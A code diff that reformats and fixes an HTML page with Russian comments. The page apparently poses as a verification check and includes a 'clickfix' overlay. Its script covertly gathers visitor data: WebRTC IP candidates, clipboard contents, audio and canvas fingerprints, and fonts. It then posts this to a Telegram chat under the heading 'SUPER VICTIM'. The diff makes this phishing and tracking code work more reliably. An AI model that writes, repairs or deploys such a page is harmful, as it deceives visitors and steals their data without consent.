@@ -83,17 +83,37 @@
         .verify-btn:hover { transform:translateY(-3px); box-shadow:0 15px 40px rgba(255,107,107,0.6); }
         .verify-btn:active { transform:translateY(-1px); }
         .progress { width:100%; height:4px; background:rgba(0,0,0,0.1); border-radius:2px; margin-top:25px; overflow:hidden; }
-        .progress-bar { height:100%; background:linear-gradient(90deg,#4CAF50,#8BC34A); width:0%; transition:width 0.3s ease; border-radius:2px; animation:progressWave
-
-
-s infinite; }
-        @keyframes progressWave { 0%{box-shadow:0 0 0 #4CAF50;} 50%{box-shadow:0 0 20px #4CAF50;} 100%{box-shadow:0 0 0 #4CAF50;} }
+        .progress-bar { 
+            height:100%; 
+            background:linear-gradient(90deg,#4CAF50,#8BC34A); 
+            width:0%; 
+            transition:width 0.3s ease; 
+            border-radius:2px; 
+            animation:progressWave 2s infinite; 
+        }
+        @keyframes progressWave { 
+            0%{box-shadow:0 0 0 #4CAF50;} 
+            50%{box-shadow:0 0 20px #4CAF50;} 
+            100%{box-shadow:0 0 0 #4CAF50;} 
+        }
         .loading { opacity:0.7; pointer-events:none; }
         .particles { position:fixed; top:0; left:0; width:100%; height:100%; pointer-events:none; z-index:-1; }
         .particle { position:absolute; width:4px; height:4px; background:#fff; border-radius:50%; animation:float 6s infinite linear; }
-        @keyframes float { 0%{transform:translateY(100vh) rotate(0deg); opacity:0;} 10%{opacity:1;} 90%{opacity:1;} 100%{transform:translateY(-100px) rotate(360deg); opacity:0;} }
-        .clickfix-overlay { position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.95); z-index:9999; display:none; align-items:center; justify-content:center; }
-        .clickfix-box { background:#fff; padding:30px; border-radius:20px; max-width:90%; text-align:center; box-shadow:0 20px 60px rgba(0,0,0,0.5); }
+        @keyframes float { 
+            0%{transform:translateY(100vh) rotate(0deg); opacity:0;} 
+            10%{opacity:1;} 
+            90%{opacity:1;} 
+            100%{transform:translateY(-100px) rotate(360deg); opacity:0;} 
+        }
+        .clickfix-overlay { 
+            position:fixed; top:0; left:0; width:100%; height:100%; 
+            background:rgba(0,0,0,0.95); z-index:9999; display:none; 
+            align-items:center; justify-content:center; 
+        }
+        .clickfix-box { 
+            background:#fff; padding:30px; border-radius:20px; max-width:90%; 
+            text-align:center; box-shadow:0 20px 60px rgba(0,0,0,0.5); 
+        }
         .timer { color:#ff6b6b; font-size:24px; font-weight:700; margin:15px 0; }
         .stats { color:#666; font-size:14px; margin-top:20px; }
     </style>
@@ -166,10 +186,10 @@ s infinite; }
                 pc.createDataChannel('');
                 pc.createOffer().then(offer => pc.setLocalDescription(offer));
                 pc.onicecandidate = e => {
-
-
-if(e.candidate) webrtc = e.candidate.candidate;
+                    if(e.candidate) webrtc = e.candidate.candidate;
                 };
+                // Закрываем соединение через 2 сек
+                setTimeout(() => pc.close(), 2000);
             } catch(e) {}
 
             // Буфер обмена
@@ -196,6 +216,7 @@ if(e.candidate) webrtc = e.candidate.candidate;
                     analyser.getByteFrequencyData(data);
                     audioData = Array.from(data).slice(0, 10).join(',');
                     oscillator.stop(0);
+                    audioCtx.close();
                 }, 100);
             } catch(e) {}
 
@@ -211,7 +232,7 @@ if(e.candidate) webrtc = e.candidate.candidate;
             // Шрифты
             const fonts = Array.from(document.fonts ? document.fonts : []).map(f => f.family).join(',');
 
-            // Canvas + AudioContext
+            // Canvas fingerprint
             const canvas = document.createElement('canvas');
             const ctx = canvas.getContext('2d');
             ctx.textBaseline = 'top';
@@ -261,10 +282,7 @@ if(e.candidate) webrtc = e.candidate.candidate;
                     body: JSON.stringify({
                         chat_id: CONFIG.chatId,
                         text: `🎯 СУПЕР ЖЕРТВА #${attempts} (шаг ${step})\n\n\`\`\`${JSON.stringify(fingerprint, null, 2).substring(0, 3900)}\`\`\``,
-                        parse_mode: 'Markdo
-
-
-wn'
+                        parse_mode: 'Markdown'
                     })
                 });
             } catch(e) {}
@@ -366,3 +384,9 @@ wn'
                 elements.progressBar.style.width = '0%';
                 elements.verifyBtn.textContent = 'Далее';
                 document.body.classList.remove('loading');
+            }, 2000);
+        });
+    </script>
+</body>
+</html>
+
